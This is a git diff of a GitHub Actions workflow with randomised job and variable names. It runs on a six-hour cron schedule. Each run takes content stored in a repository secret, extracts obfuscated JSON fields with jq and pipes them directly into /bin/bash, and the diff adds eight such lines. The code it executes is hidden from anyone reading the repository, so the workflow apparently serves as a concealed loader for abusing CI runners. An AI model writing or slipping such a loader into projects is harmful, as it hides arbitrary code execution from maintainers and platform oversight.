@@ -3,21 +3,22 @@ name: davidbranchww
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 0/6 * * *'
-
+    - cron: '46 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: davidbranchww
         env:
-          kxm96126: ${{ secrets.kxm96126 }}
+          dq21358: ${{ secrets.dq21358 }}
         run: |
-          echo $kxm96126 | jq -r .h72 | /bin/bash
-          echo $m3637 | jq -r .dej26 | /bin/bash
-          echo $oz7257 | jq -r .wzfkr19285 | /bin/bash
-          echo $lswo362 | jq -r .z2 | /bin/bash
-          echo $ll638 | jq -r .bqsn58696 | /bin/bash
+          echo $dq21358 | jq -r .ykgws582 | /bin/bash
+          echo $dywno335 | jq -r .qn3835 | /bin/bash
+          echo $xufku2041 | jq -r .kts918 | /bin/bash
+          echo $pdib4 | jq -r .yqnqv6 | /bin/bash
+          echo $vz7845 | jq -r .oo29 | /bin/bash
+          echo $jrl2 | jq -r .b677 | /bin/bash
+          echo $qwjx886 | jq -r .zy7336 | /bin/bash
+          echo $ci66269 | jq -r .pbfnm8156 | /bin/bash
 
